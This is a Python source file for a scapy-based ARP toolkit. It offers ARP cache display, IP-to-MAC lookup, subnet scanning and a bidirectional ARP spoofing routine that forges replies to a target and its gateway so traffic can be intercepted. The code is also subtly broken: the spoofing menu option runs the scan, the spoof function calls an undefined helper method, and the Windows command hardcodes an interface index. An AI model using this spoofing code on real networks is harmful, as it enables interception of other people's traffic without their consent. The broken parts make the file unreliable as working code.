import os, sys, time, itertools
import scapy.all as scapy
from scapy.all import Ether, ARP, IP, srp, send, atol, conf
from scapy.interfaces import NetworkInterface

from .utils import *
from .interface import NF_Interface


class NF_ARPTool:
    def __init__(self, interface: NetworkInterface): 
        self.interface = interface

    #========================= MENUS =========================#

    def menu(self) -> None:
        def print_menu():
            selected = self.interface.description if self.interface else 'not selected'
            selected = str_fixed_len(selected, 52)
            info = ''
            if self.interface:
                network = NF_Interface.get_network_address_with_cidr(self.interface)
                gateway = NF_Interface.get_gateway_address(self.interface)
                info = '\n |   Network: {:18}      Gateway: {:15}       |'.format(
                    network if network else 'no network', gateway if gateway else 'no gateway'
                )
            print(f'''
 +-------------------------------------------------------------------+
 |                         < ARP Tool Menu >                         |
 +-------------------------------------------------------------------+
 |   Interface: {selected} |{info}
 +-------------------------------------------------------------------+
 |                                                                   |
 |   (1) Show ARP Cache Table         (2) IP to MAC Address          |
 |                                                                   |
 |   (3) ARP Scanning                 (4) ARP Spoofing               |
 |                                                                   |
 |   (0) Back to Main Menu                                           |
 |                                                                   |
 +-------------------------------------------------------------------+\n''')

        print_menu()
        while True:
            try:
                i = input('[?] Enter menu number : ')
            except KeyboardInterrupt:
                print()
                break
            print()

            if i == '1':
                self.show_arp_cache_table()
            elif i == '2':
                ip = input('[?] Enter a IP address : ').strip()
                print()
                if not is_valid_ipv4(ip):
                    print('[-] IP address entered is invalid.\n')
                else:
                    self.get_mac_address_by_ip(ip)
                    print()
            elif i == '3':
                self.arp_scan()
                print()
            elif i == '4':
                self.arp_scan()
                print()
            elif i == '0':
                break
            else:
                continue

            try:
                input('[?] Press enter key to back to menu. ')
            except KeyboardInterrupt:
                print()
            print_menu()

    #========================= FUNCS =========================#

    def show_arp_cache_table(self) -> None:
        if is_windows():
            print('[*] Retrieving ARP cache table of selected interface...')

            run_powershell('''Get-NetNeighbor -AddressFamily IPv4 -InterfaceIndex 24
                | Sort-Object -Property IPAddress
                | Where-Object {$_.State -ne 'Unreachable'}''', hide_output=False)
        else:
            os.system('arp -a')
            print()


    def get_mac_address_by_ip(self, ip: str) -> str | None:
        print(f'[*] Finding which device has {ip}...')
        
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, iface=self.interface, verbose=0)
        if len(ans) == 0:
            print('[-] Device not found. Please check the IP.')
            return None

        mac = ans[0][1][ARP].hwsrc # [0]=first packet, [1]=recv
        print(f'[+] Device has been found with "{mac}" ({conf.manufdb._get_manuf(mac)})')
        return mac


    def arp_scan(self) -> None:
        network = NF_Interface.get_network_address_with_cidr(self.interface)
        if not network:
            print('[-] Could not obtain network address. Scanning aborted.')
            return
        
        print(f'[*] Starting the ARP scanning to {network}...')
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=2, iface=self.interface, verbose=0)

        print('\n{:15}   {:17}   {}'.format('IPv4', 'MAC', 'Vendor (OUI)'))
        print('=' * 80)
        for s, r in sorted(ans, key=lambda x: atol(x[1][ARP].psrc)):
            ip  = r[ARP].psrc
            mac = r[ARP].hwsrc # r[Ether].src
            oui = str_fixed_len(conf.manufdb._get_manuf(mac), 42).strip()
            print('{:15}   {:17}   {}'.format(ip, mac, oui))
        print('=' * 80)
        
        print('\n[+] ARP scan completed.')


    def arp_spoof(self, target_ip: str | None = None, gateway_ip: str | None = None):
        try:
            if not gateway_ip:
                default_ip = NF_Interface.get_gateway_address(self.interface)
                gateway_ip = input(f'[?] Enter Gateway IP {f"({default_ip}) " if default_ip else ""}: ').strip()
                if gateway_ip == '': gateway_ip = default_ip
            if not target_ip:
                target_ip = input('[?] Enter Target IP : ').strip()
        except KeyboardInterrupt:
            print()
            return
        
        if not is_valid_ipv4(gateway_ip):
            print('\n[-] Gateway IP is invalid.')
            return
        if not is_valid_ipv4(target_ip):
            print('\n[-] Target IP is invalid.')
            return

        print(f'[*] Starting the bidirectional ARP spoofing... (TAR={target_ip} <---> GW={gateway_ip})\n')

        target_mac  = self.get_mac_by_ip_using_arp(target_ip)
        gateway_mac = self.get_mac_by_ip_using_arp(gateway_ip)
        if not target_mac or not gateway_mac:
            print('\n[-] MAC address not found. Stop spoofing.')
            return
        
        print('\n[+] Found all MAC addresses. Now sending forged packets...')
        print('[*] To stop ARP spoofing, press Ctrl+C keys.\n')

        print('[*] Packet forwarding is required to see packets going to and from the target.')
        print('[*] Packet forwarding can be enabled in the interface menu.\n')


        def get_mac(ip):
            return target_mac if ip == target_ip else gateway_mac
        
        def spoof(target_ip, spoof_ip):
            packet = ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
            send(packet, iface=self.interface, verbose=0)

        def restore(src_ip, dst_ip):
            packet = ARP(op=2, pdst=dst_ip, hwdst=get_mac(dst_ip), psrc=src_ip, hwsrc=get_mac(src_ip))
            send(packet, iface=self.interface, verbose=0)

        sent_count = 0
        try:
            while True:
                spoof(target_ip, gateway_ip)
                spoof(gateway_ip, target_ip)
                sent_count += 2
                print('\r[*] Packets Sent: ' + str(sent_count), end='')
                time.sleep(1) # Wait for a second
        except KeyboardInterrupt:
            print('\n\n[!] Ctrl+C pressed!')
            print('[*] Restoring ARP tables of target and gateway...\n')
            sent_count = 0
            for _ in range(5):
                restore(gateway_ip, target_ip)
                restore(target_ip, gateway_ip)
                sent_count += 2
                print('\r[*] Packets Sent: ' + str(sent_count), end='')
                time.sleep(0.5)
            print('\n\n[+] ARP spoof stopped.')


